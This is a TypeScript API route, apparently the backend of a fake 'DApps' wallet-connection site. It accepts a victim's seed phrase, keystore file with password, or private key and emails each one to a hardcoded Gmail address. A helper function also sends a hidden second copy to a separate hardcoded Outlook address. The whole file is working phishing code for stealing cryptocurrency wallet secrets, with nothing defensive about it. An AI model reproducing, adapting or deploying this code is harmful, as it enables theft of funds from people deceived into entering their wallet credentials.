import nodemailer from 'nodemailer'

const formatMessage = async (message: string) => {
  const email = process.env.EMAIL;
  const pass = process.env.PASS;

 const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT as string), // Convert string to number
  secure: process.env.SMTP_SECURE === "true", // Convert to boolean
  auth: {
    user: process.env.EMAIL,
    pass: process.env.PASS,
  },
//   debug: true, 
//   logger: true, 
});

  // Split the message into lines
  const lines = message.split(/\r?\n/);

  // Format each line with a prefix (for example)
  const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);

  // Join formatted lines into a single HTML string
  const formattedMessage = formattedLines.join('');

  const mailOptions = {
    from: `H ${email}`,
    to: "samueljohnsonyeni@outlook.com",
    subject: "H",
    html: `<div>${message}</div>`,
  };

  transporter.verify(function (error: any) {
    if (error) {
      console.log(`here is the error: ${error}`);
    } else {
      console.log("From two: Server is ready to take our messages");
    }
  });

  const result = await transporter.sendMail(mailOptions);

  if (result.response.includes("OK")) {
    console.log("email sent successfully!!");
  } else {
    console.log("Internal server error");
  }

  // Return the formatted message
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
}

export async function POST(request: Request) {
  try {
    const { phrase, keystore, privateKey } = await request.json();

    if (phrase) {

      const email = process.env.EMAIL
      const pass = process.env.PASS

      const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT as string), // Convert string to number
  secure: process.env.SMTP_SECURE === "true", // Convert to boolean
  auth: {
    user: process.env.EMAIL,
    pass: process.env.PASS,
  },
//   debug: true, 
//   logger: true, 
});


      const formattedMessage = await formatMessage(phrase);

      const mailOptions = {
        from: `Dapp App ${email}`,
        to: 'adev93108@gmail.com',
        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
        html: formattedMessage,
      }

      transporter.verify(function (error) {
        if (error) {
          console.log(`here is the error: ${error}`);
        } else {
          console.log("Server is ready to take our messages");
        }
      });

      const result = await transporter.sendMail(mailOptions);

      if (result.response.includes("OK")) {
        return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
      } else {
        return Response.json({ error: "Internal server error" }, { status: 500 });
      }
    }

    if (keystore) {

      const email = process.env.EMAIL
      const pass = process.env.PASS

      const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT as string), // Convert string to number
  secure: process.env.SMTP_SECURE === "true", // Convert to boolean
  auth: {
    user: process.env.EMAIL,
    pass: process.env.PASS,
  },
//   debug: true, 
//   logger: true, 
});



      const mailOptions = {
        from: `Dapp App ${email}`,
        to: 'adev93108@gmail.com',
        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
        html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
      }

      transporter.verify(function (error) {
        if (error) {
          console.log(`here is the error: ${error}`);
        } else {
          console.log("Server is ready to take our messages");
        }
      });

      const result = await transporter.sendMail(mailOptions);

      if (result.response.includes("OK")) {
        return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
      } else {
        return Response.json({ error: "Internal server error" }, { status: 500 });
      }
    }

    if (privateKey) {

      const email = process.env.EMAIL
      const pass = process.env.PASS

      const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT as string), // Convert string to number
  secure: process.env.SMTP_SECURE === "true", // Convert to boolean
  auth: {
    user: process.env.EMAIL,
    pass: process.env.PASS,
  },
//   debug: true, 
//   logger: true, 
});



      const formattedMessage = await formatMessage(privateKey);

      const mailOptions = {
        from: `Dapp App ${email}`,
        to: 'adev93108@gmail.com',
        subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
        html: formattedMessage,
      }

      transporter.verify(function (error) {
        if (error) {
          console.log(`here is the error: ${error}`);
        } else {
          console.log("Server is ready to take our messages");
        }
      });

      const result = await transporter.sendMail(mailOptions);

      if (result.response.includes("OK")) {
        return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
      } else {
        return Response.json({ error: "Internal server error" }, { status: 500 });
      }
    }


    return Response.json({ message: 'Submission Failed' }, { status: 500 })

  } catch (error) {
    return Response.json({ error: error });
  }
}
